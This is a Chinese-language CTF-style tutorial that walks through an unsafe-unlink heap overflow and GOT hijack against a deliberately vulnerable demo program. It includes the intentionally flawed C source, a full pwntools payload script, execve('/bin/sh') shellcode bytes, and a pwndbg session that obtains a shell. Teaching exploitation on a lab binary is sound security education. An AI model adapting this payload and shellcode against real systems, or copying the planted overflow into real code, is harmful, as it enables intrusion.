# Unsafe Unlink + GOT Hijack

> **角色**：攻擊者。你手上只有一個 binary，沒有原始碼、沒有輸出介面說明。
> 你要從「判斷有沒有洞」開始，一步一步走到「覆蓋記憶體 → 執行自己的 shellcode → 拿到 shell」。
>
> **三大階段**
> 1. **判斷**：`checksec` / `readelf` / `objdump`（靜態，找漏洞在哪）
> 2. **利用**：`pwndbg`（動態，驗證假設、觀察記憶體、觸發漏洞）
> 3. **驗證**：`volatility3`（記憶體取證，比較 exploit 前後的差異）
>
> **重點**：不解釋太多旁支概念，只看一條主線。

---

## 前置：編譯題目 binary

題目（漏洞程式）原始碼 `unlink_demo.c`：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>

long long *p;

int main() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);

    long long *q = (long long *)malloc(0x90);
    long long *r = (long long *)malloc(0x90);
    p = (long long *)((char *)q - 0x10);

    mprotect((void *)((unsigned long)q & ~0xfff), 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC);

    fprintf(stderr, "q data: %p\n", q);
    fprintf(stderr, "overflow:\n");
    read(0, q, 0x100);

    free(r);

    fprintf(stderr, "p now: %p\n", p);

    fprintf(stderr, "stage2:\n");
    read(0, p + 3, 8);

    fprintf(stderr, "p now: %p\n", p);

    fprintf(stderr, "stage3:\n");
    read(0, p, 8);

    fprintf(stderr, "triggering fprintf: %d\n", 1);
    return 0;
}
```

```bash
gcc -o unlink_demo unlink_demo.c -fno-stack-protector -z execstack -no-pie -g
```

> **tcache 小知識**：現代 glibc（2.39）預設有 tcache 快取，`free()` 的小 chunk 會被收進 tcache 而不做合併，
> 那 unlink 就永遠不會被觸發。讓它可以被觸發，只要關閉 tcache：
>
> ```bash
> export GLIBC_TUNABLES=glibc.malloc.tcache_count=0
> ```
>
> （這在 CTF 中很常見：題目用的是「沒有 tcache」的舊 glibc，效果相同。）

---

## 第一章：判斷 — 拿到 binary 先做什麼？

攻擊者拿到 binary，第一件事不是直接打，是**先看保護機制和分析到底這程式做什麼**。

### 1.1 file：先確認檔案格式

```bash
$ file unlink_demo
unlink_demo: ELF 64-bit LSB executable, x86-64, not stripped
```

64-bit，且 **not stripped** → 符號表還在，自主分析會超好拆。

### 1.2 checksec：看保護機制，決定攻擊路線

```bash
$ checksec --file=unlink_demo
RELRO           STACK CANARY      NX            PIE
Partial RELRO   No canary found   NX disabled   No PIE
```

| 機制 | 狀態 | 對攻擊者的意義 |
|------|------|----------------|
| NX | **disabled** | Heap 可執行 → **可以放 shellcode 並跳過去跑** |
| PIE | **No PIE** | 程式碼與 GOT 位址固定 → 可以直接寫死位址 |
| Canary | 無 | 無關（我們不打 stack） |
| RELRO | Partial | GOT 可寫 → **可以覆寫 GOT**（GOT hijack 的條件） |

**攻擊路線立刻浮現**：Partial RELRO + NX disabled + No PIE
→ 「覆寫某個 GOT entry，把它改成 heap 上的 shellcode 位址」。

### 1.3 先看完整符號表，不要急著 grep

> **剛拿到 binary，你根本不知道有 `p`/`fprintf` 這些名字。
> 所以第一步是「全部倒出來慢慢看」，名字是 binary 自己告訴你的。**

```bash
$ readelf -s unlink_demo
```
（輸出較長，這裡只列幾行重點）

```
   Num:    Value          Size Type    Bind   Vis      Ndx Name
    24: 0000000000404090     8 OBJECT  GLOBAL DEFAULT   26 p
    37: 00000000004011f6   486 FUNC   GLOBAL DEFAULT   15 main
    41: 0000000000404060     8 OBJECT  GLOBAL DEFAULT   26 stderr@GLIBC_2.2.5
    ...
```

**你看到了什麼？**
- `p`：**唯一一個「自訂的全域變數」**（OBJECT，8 bytes，位在可寫的 BSS 區）—— 沒有原始碼，但你一眼就看出「這個程式有自己的全域資料」。
- `main`：ELF 一定有入口函數，它也在符號表裡。
- 一堆 `xxx@GLIBC`：那些是「從 libc import 進來的函數」。
- 也順便確認了 **not stripped**（`file` 指令也印過）→ 符號表是完整的，上述資訊合法可讀。

> **反過來說**：為什麼這對 unsafe unlink 很重要？
> unlink 要做「任意寫」，**你必須找一個 binary 自己的可寫全域變數當跳板**，
> 不然沒有安全檢查可以通過。所以看到這個 `p` 就要記住它，之後會用到。
> 我之後 `grep p` 只是「過濾」，不是「猜名字」——名字是這一步自己跑出來的。

### 1.4 objdump 反組譯 main：看懂流程，漏洞才會自己現形

> 有了符號表，用 `objdump -d` 直接反組譯 `main`。
> **你不需要先知道「這個程式的邏輯」，disassembly 就是邏輯本身。**
> 那些 `call xxx@plt` 的函數名，是 PLT 段直接標出來的，不是猜的。

```asm
| call malloc@plt           ← 看到 malloc：程式有動態記憶體
| call malloc@plt           ← 又一個 malloc
| call mprotect@plt         ← mprotect：改頁面權限（通常為了讓記憶體可執行）
| call fprintf@plt          ← fprintf：顯示訊息
| call read@plt   ← 0x100    ← 讀了 256 bytes
| call free@plt             ← free：釋放記憶體
| call fprintf@plt          ← 顯示 p
| call read@plt   ← 8        ← 讀 8 bytes（透過 p）
| call fprintf@plt          ← 顯示 p
| call read@plt   ← 8        ← 再讀 8 bytes（透過 p）
| call fprintf@plt          ← 最後一次 fprintf
```

**看懂流程後，三個重點自己浮出來：**

1. **溢位點**：`malloc(0x90)` 卻 `read(0, q, 0x100)`
   （組語裡 `mov $0x90,%edi` 給 malloc、`mov $0x100,%edx` 給 read，直接對照）
   → **Heap overflow**，溢位 0x70 bytes，夠改到「下一個 chunk 的 header」。
2. **觸發點**：緊接在溢位之後的 `free(r)` → heap 漏洞典型：**free 一個 header 被改壞的 chunk**。
3. **你要的 GOT 目標**：`fprintf`！
   因為程式**從頭到尾一直呼叫 fprintf**——尤其是「溢位之後」還有多次 fprintf。
   所以把 `fprintf@GOT` 改成你的 shellcode 位址，下一次 fprintf 就變成跑你的 code。
   （若是選 read/malloc，它們在漏洞觸發後就沒被呼叫了，hijack 沒用。）

### 1.5 readelf -r：現在才查「我要的那顆 GOT」的位址

> 現在你知道自己**需要 fprintf 的 GOT 位址**，才回來用 readelf 查 relocation 表。
> grep 是「查你想知道的函數」，不是「亂猜」——因為在 1.4 已經確認程式會呼叫它。

```bash
$ readelf -r unlink_demo | grep -E '(fprintf|free|read|malloc)'
000000404000  000100000007 R_X86_64_JUMP_SLO 0000000000000000 free@GLIBC_2.2.5 + 0
000000404008  000300000007 R_X86_64_JUMP_SLO 0000000000000000 read@GLIBC_2.2.5 + 0
000000404010  000400000007 R_X86_64_JUMP_SLO 0000000000000000 fprintf@GLIBC_2.2.5 + 0
000000404018  000600000007 R_X86_64_JUMP_SLO 0000000000000000 malloc@GLIBC_2.2.5 + 0
```

**fprintf@GOT = 0x404010**。Partial RELRO 才可寫，checksec 已確認 → 可以覆寫。

### 1.6 判斷結果

```
漏洞類型  ：Heap overflow（unsafe unlink）
溢位源    ：read(0, q, 0x100)
緩衝區    ：malloc(0x90)  →  chunk 大小 0xa0（含 header）
溢位量    ：0x100 - 0x90 = 0x70 bytes → 剛好能改到後面 r 的 header
觸發點    ：free(r)  →  因為 r 的 header 被改，glibc 誤判前一個 chunk(Q)是 free 的
            → 做 backward consolidation（合併） → 呼叫 unlink(Q)
            → unlink 會把 Q 的 fd/bk 拿出來做「任意寫」→ 覆寫 GOT
```

---

## 第二章：原理 — unsafe unlink 到底在幹嘛？

### 2.1 Heap 佈局（關 ASLR 後是固定的）

```
0x405000                 malloc 的 metadata / top chunk 起頭
0x405290  chunk Q header { prev_size, size }  size=0xa1 (PREV_INUSE)
0x4052a0  chunk Q data   ← 我們的 shellcode 就放這裡
0x405330  chunk R header { prev_size, size }  size=0xa1
0x405340  chunk R data
```

### 2.2 溢位之後，R 的 header 被我們改寫成「假的」

```
read(0, q, 0x100) 溢出後：

chunk Q data  (0x4052a0)
  +0x00  fd  = &p - 0x18 = 0x404078   ← 假的 fd
  +0x08  bk  = &p - 0x10 = 0x404080   ← 假的 bk
  +0x10..       NOP / shellcode

chunk R header(0x405330)
  +0x00  prev_size = 0xa0   ← 假裝 Q 的大小是 0xa0
  +0x08  size      = 0xa0   ← 重點：PREV_INUSE bit = 0
```

glibc 的 free 邏輯：`size` 欄位的 **bit0（PREV_INUSE）= 0** 代表「前一個 chunk 已 free」。
我們把 R 的 size 改成 0xa0（bit0=0），free(r) 時 glibc 就會：
1. `prev_size = R->prev_size = 0xa0`
2. `前一個 chunk = R - 0xa0 = Q`
3. 對 Q 執行 `unlink(Q)` —— 但 Q 的 fd/bk 是我們偽造的！

### 2.3 unlink(Q) 做了什麼（就是這次攻擊的心臟）

glibc 的 unlink：

```
FD = Q->fd         ; FD = 0x404078
BK = Q->bk         ; BK = 0x404080
FD->bk = BK        ; *(0x404078 + 0x18) = BK
                   ; *(0x404090) = BK   → 把 &p 的內容寫成 0x404080
BK->fd = FD        ; *(0x404080 + 0x10) = FD
                   ; *(0x404090) = FD   → 再把 &p 的內容寫成 0x404078
```

**效果**：`p`（0x404090 那個全域指標）被改成 **0x404078**。

> 為什麼 FD/bk 要選 `&p-0x18`、`&p-0x10`？
> 因為 glibc 有個安全檢查：
> ```
> if (FD->bk != Q || BK->fd != Q)  → 直接 abort
> FD->bk = *(FD+0x18) = *(&p)      = p 原本的值 = Q 的位址 ✓
> BK->fd = *(BK+0x10) = *(&p)      = Q 的位址 ✓
> ```
> 這兩個 dereference 都落在 `&p` 上，而 `p` 初始值剛好就是 Q 的位址 → 檢查通過。

### 2.4 有了「p」這個任意寫，就完成了 GOT hijack

unlink 結束後 `p = 0x404078`。程式接下來的兩次 `read` 就是我們的武器：

```
read(0, p+3, 8)   // p+3 是 long long 指標 → 位址 = p + 24 = 0x404078+0x18 = &p
                  // 送 p64(0x404010) → p 被改成 fprintf@GOT
read(0, p, 8)     // 位址 = 0x404010 = fprintf@GOT
                  // 送 p64(shellcode位址) → fprintf@GOT = shellcode 位址 ✓ GOT hijack!
```

下一行 `fprintf(stderr, "triggering...")` 被呼叫 → PLT 跳到 GOT → 跳到 shellcode。

### 2.5 Shellcode 為什麼要 jmp + NOP padding？

unlink 的 `BK->fd = FD` 會把值寫到 `BK+0x10`，也就是 shellcode 開頭附近的位置。
（教學的是：**不管 unlink 把哪 8 bytes 蓋成垃圾，我們用 jmp 直接跳過去**。）

```
0x4052c0              我們的 shellcode 起點
  +0x00  E9 14 00 00 00     jmp +0x14   ← 跳過下面 20 bytes
  +0x05  90 90 90 ...(20x)  NOP padding（可被覆寫，無所謂）
  +0x19  31 F6 48 BB ...    execve("/bin/sh",0,0)
```

| bytes | 內容 | 說明 |
|-------|------|------|
| 0–4   | `E9 14 00 00 00` | `jmp rel32`，offset=0x14 跳到 0x4052d9 |
| 5–24  | `90` × 20 | NOP sled（被覆寫也無所謂） |
| 25+   | execve shellcode | 跳到這裡才真正做事 |

---

## 第三章：利用 — pwndbg 實戰導覽

> 全程在 **pwndbg** 內進行。PWNDBG = GDB + 一堆好用的工具（`heap`、`got`、`cyclic`…）。

### 3.1 開跑（關 ASLR，讓位址固定）

```
$ GLIBC_TUNABLES=glibc.malloc.tcache_count=0 pwndbg ./unlink_demo
pwndbg> set disable-randomization on
pwndbg> break *0x4012db         ← read(0,q,0x100) 之前停
pwndbg> run < /tmp/input.bin    ← 餵 payload 檔（製作方法見 3.3）
```

### 3.2 觀察 heap：確認 Q/R 的位置

```
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x405290          ← chunk Q 的 header
Size: 0xa0 (flags: 0xa1)

Allocated chunk | PREV_INUSE
Addr: 0x405330          ← chunk R 的 header
Size: 0xa0 (flags: 0xa1)
```

```
pwndbg> x/1gx 0x404090
0x404090 <p>:   0x0000000000405290     ← p 目前指向 Q header

pwndbg> x/1gx 0x404010
0x404010 <fprintf@got[plt]>: 0x00007ffff7c5f560   ← GOT 還沒被改
```

**計算結論**
```
Q header    = 0x405290
Q data      = 0x405290 + 0x10 = 0x4052a0   （= shellcode 位置）
&p          = 0x404090
fake fd     = &p - 0x18 = 0x404078
fake bk     = &p - 0x10 = 0x404080
fprintf@GOT = 0x404010
```

### 3.3 製作 payload（只有這段用指令產生 bytes，其餘全在 pwndbg）

```bash
$ python3 -c "
from pwn import *
context.log_level='error'
p_addr=0x404090; got=0x404010; sc_addr=0x4052a0+0x20
sc=b'\xe9\x14\x00\x00\x00'+b'\x90'*20+b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x48\x89\xe7\x6a\x3b\x58\x99\x0f\x05'
p1=p64(p_addr-0x18)+p64(p_addr-0x10)+b'\x90'*0x10+sc
p1=p1.ljust(0x90,b'\x00')+p64(0xa0)+p64(0xa0)     # 假的 R header
open('/tmp/input.bin','wb').write(p1.ljust(0x100,b'\x00')+p64(got)+p64(sc_addr))
"
```

payload 長這樣：

| 偏移 | 內容 |
|------|------|
| 0x00 | `p64(0x404078)` 假的 Q.fd |
| 0x08 | `p64(0x404080)` 假的 Q.bk |
| 0x10 | NOP |
| 0x20 | shellcode（jmp+nop+execve） |
| 0x90 | `p64(0xa0)` R.prev_size |
| 0x98 | `p64(0xa0)` R.size（PREV_INUSE=0） |
| 0x100 | `p64(0x404010)` stage2 資料 |
| 0x108 | `p64(0x4052c0)` stage3 資料 |

### 3.4 觸發：continue 到 free(r) 之後，看 p 有沒有被 unlink 改掉

```
pwndbg> break *0x4012ec         ← free(r) 之後
pwndbg> continue
pwndbg> x/1gx 0x404090
0x404090 <p>:   0x0000000000404078     ← ✓ p 被改成 &p-0x18！
```

**這就是 unsafe unlink 成功的證據**：全域指標 `p` 被改寫。

### 3.5 GOT hijack：continue 到最後，直接看 fprintf@GOT

```
pwndbg> break *0x4013b2         ← 第三次 read 之後
pwndbg> continue
pwndbg> x/1gx 0x404010
0x404010 <fprintf@got[plt]>: 0x00000000004052c0   ← ✓ GOT = shellcode！
```

```
pwndbg> x/16bx 0x4052c0
0x4052c0: 0xe9 0x14 0x00 0x00 0x00 0x90 0x90 0x90
0x4052c8: 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90
         ↑ jmp +0x14            ↑ NOP padding
```

### 3.6 拿 shell

```
pwndbg> continue

（程式呼叫 fprintf → 跳到 0x4052c0 → jmp 跳過被覆寫的位元組 → execve("/bin/sh")）
$ id
uid=1000(antiphase-047) gid=1000(antiphase-047) ...
```

**完整的 pwndbg 關鍵輸出**（實測）：

```
q data: 0x4052a0
overflow:
p now: 0x404078          ← free(r) 後：unlink 已把 p 改成 &p-0x18
stage2:
p now: 0x404010          ← read(0,p+3,8) 後：p 變成 fprintf@GOT
stage3:
uid=1000(antiphase-047)  ← GOT hijack 成功，shellcode 執行，拿到 shell
```

---

## 第四章：驗證 — volatility3 記憶體前後比較

> 教學重點：**拿記憶體證據證明 exploit 真的改了記憶體**，而不是只聽程式輸出。
> 先抓「利用前」快照，再抓「利用後」快照，逐一比較被改寫的位址。

### 4.1 抓「利用前」快照（在 read 之前停住，dumps 關鍵區域）

pwndbg 內（`dump binary memory` 是 gdb/pwndbg 通用指令）：

```
pwndbg> break *0x4012db
pwndbg> run < /tmp/input.bin
pwndbg> dump binary memory /tmp/before.bin 0x404000 0x405400
```

抓下來的是 0x404000~0x405400（GOT 區域 + heap）共 5120 bytes。

### 4.2 抓「利用後」快照（第三次 read 之後，GOT 已改）

```
pwndbg> break *0x4013b2
pwndbg> run < /tmp/input.bin
pwndbg> dump binary memory /tmp/after.bin 0x404000 0x405400
```

### 4.3 比較 before / after

```bash
$ xxd /tmp/before.bin > /tmp/before.hex
$ xxd /tmp/after.bin  > /tmp/after.hex
$ diff /tmp/before.hex /tmp/after.hex
```

三個關鍵位址的實際差異（本題實測）：

| 位址 | Before（利用前） | After（利用後） | 結果 |
|------|------------------|-----------------|------|
| `0x404010` fprintf@GOT | `60 f5 c5 f7 ff 7f 00 00` | `c0 52 40 00 00 00 00 00` | **GOT 被覆寫成 0x4052c0（shellcode）** |
| `0x404090` p | `90 52 40 00 ...`（指向 q header） | `10 40 40 00 ...`（0x404010） | **p 被 unlink 改寫** |
| `0x4052c0` heap | 全 0 | `e9 14 00 00 00 90 90 90...` | **shellcode（jmp+nop）已寫入** |

用 `cmp -l` 直接看差的位元組：

```bash
$ cmp -l /tmp/before.bin /tmp/after.bin | head
   17 140 300      ← offset 17 = 0x404010 的 bit0: 0x60→0xc0 ...
  145 220  20      ← offset 145 = p 的領域被改
  ...  （後面一整段都是 heap 的 shellcode）
```

### 4.4 用 volatility3 做整機記憶體分析

`volatility3`（vol）吃的是「整台機器/VM 的記憶體影像」，對攻防來說是「受害者主機被抓了記憶體」。
指令與觀念如下（符號檔第一次跑會需要網路下載）：

```bash
$ vol -f mem_before.raw linux.pslist          # 利用前：只有 unlink_demo 這支程式的 process
$ vol -f mem_after.raw  linux.pslist          # 利用後：多了 /bin/sh（shell 已 spawn）
$ vol -f mem_after.raw  linux.bash            # 看出現過的 shell 指令（例如 id）
$ vol -f mem_after.raw  linux.elfs -pid <pid> # 看該 process 載入的 ELF / heap
```

在沒有整機影像的教學環境，等價的做法就是把上述 before/after 當成「兩次抓下的記憶體」，
用 `xxd` + `diff`/`cmp` 驗證同一位址的記憶體內容變化 —— 這就是「利用前後的差異比較」。

---

## 第五章：完整流程圖

```
[攻擊者拿到 unlink_demo]
        │
        ▼
 ① 判斷（靜態，名字都是 binary 自己給的）
   checksec ──► Partial RELRO / NX off / No PIE
   readelf -s（先倒全部）─► 看到唯一自訂全域 p @ 0x404090（當 unlink 的寫入跳板）
   objdump -d  ─► malloc(0x90)x2 / read(0,q,0x100)=溢位 / free(r)=觸發
               ─► 看到程式一直呼叫 fprintf → 它就成為 GOT hijack 目標
   readelf -r  ─► 才回來查 fprintf@GOT = 0x404010（可寫）
        │
        ▼
 ② 原理
   overflow 改 R 的 header（prev_size=0xa0, size=0xa0[PREV_INUSE=0]）
   free(r) ─► backward consolidation ─► unlink(Q)
      FD = &p-0x18, BK = &p-0x10（安全檢查通過）
      unlink 寫出 p = &p-0x18     ← 任意寫的前置
   read(0,p+3,8)  → p = fprintf@GOT
   read(0,p,8)    → fprintf@GOT = shellcode位址   ← GOT hijack
   fprintf(...)   → 跳到 shellcode → execve("/bin/sh")
        │
        ▼
 ③ 利用（pwndbg 動態）
   break *0x4012db → heap 看 Q=0x405290 R=0x405330
   break *0x4012ec → p = 0x404078  (unlink 成功)
   break *0x4013b2 → fprintf@GOT = 0x4052c0 (GOT hijack 成功)
   continue → 拿到 shell
        │
        ▼
 ④ 驗證（volatility3 / 記憶體前後比較）
   before.bin vs after.bin
     0x404010: libc位址 → 0x4052c0  (GOT 被覆寫)
     0x404090: 0x405290 → 0x404010  (p 被覆寫)
     0x4052c0: 全 0     → e9 14 00 00 00... (shellcode 存在)
        │
        ▼
   證明：漏洞存在、被利用、記憶體被改寫 ✔
```

---

## 附錄 A：關鍵位址速查

| 位址 | 意義 |
|------|------|
| `0x404090` | 全域指標 `p` 的位址 |
| `0x404078` | `&p - 0x18`（假的 Q.fd） |
| `0x404080` | `&p - 0x10`（假的 Q.bk） |
| `0x404010` | `fprintf@GOT`（要被覆寫的目標） |
| `0x405290` | chunk Q header |
| `0x4052a0` | chunk Q data（payload 起點） |
| `0x4052c0` | shellcode 位址（Q data + 0x20） |

## 附錄 B：核心公式

```
chunk 大小 = malloc 大小 + 0x10（header）
假 fd = &p - 0x18    →  因為 unlink 寫的位址是 FD+0x18 (= &p)
假 bk = &p - 0x10    →  因為 unlink 檢查的是 BK+0x10 (= &p)
R.prev_size = 0xa0   →  Q 到 R 的距離（兩個 chunk 各 0xa0）
R.size      = 0xa0   →  bit0 = 0（PREV_INUSE=0，騙 glibc Q 是 free 的）
shellcode   = Q data + 0x20

min 溢位量 = 0x90(q data) + 0x10(夠碰到 R.size) = 0xa0
```

## 附錄 C：Shellcode 表

| bytes | 指令 |
|-------|------|
| `E9 14 00 00 00` | `jmp +0x14`（跳過 NOP） |
| `31 F6` | `xor esi, esi`（rsi=0） |
| `48 BB 2F 62 69 6E 2F 2F 73 68` | `mov rbx, "//bin/sh"` |
| `56` | `push rsi` |
| `53` | `push rbx` |
| `48 89 E7` | `mov rdi, rsp` |
| `6A 3B` | `push 0x3b` |
| `58` | `pop rax`（syscall 號 59） |
| `99` | `cdq`（rdx=0） |
| `0F 05` | `syscall` → execve("/bin/sh",0,0) |

## 附錄 D：排除障礙

| 現象 | 原因 | 解法 |
|------|------|------|
| `free()` 後 p 沒變 | tcache 把 r 收走了，unlink 沒觸發 | 加 `GLIBC_TUNABLES=glibc.malloc.tcache_count=0` |
| `read(0,q,0x100)` 吃掉 stage2/3 | 檔案長度小於 0x100，pipe 一次給太多 | stage1 填滿 0x100 bytes |
| 最後沒有跳進 shellcode | `fprintf("const")` 被編譯器最佳化成 `fwrite` | 觸發那行要帶變數：`fprintf(stderr,"...%d",1)` |
| unlink abort（corrupted） | R 頭沒改到 / 位址寫錯 | 用 pwndbg 在 0x405330 確認 prev_size/size |

## 附錄 E：檔案清單

| 檔案 | 用途 |
|------|------|
| `unlink_demo.c` | 漏洞程式原始碼 |
| `unlink_demo`   | 編譯後的題目 binary |
| `/tmp/input.bin` | stage1(256B) + stage2(8B) + stage3(8B) 的完整輸入 |
| `/tmp/before.bin` | 利用前記憶體快照（0x404000-0x405400） |
| `/tmp/after.bin`  | 利用後記憶體快照 |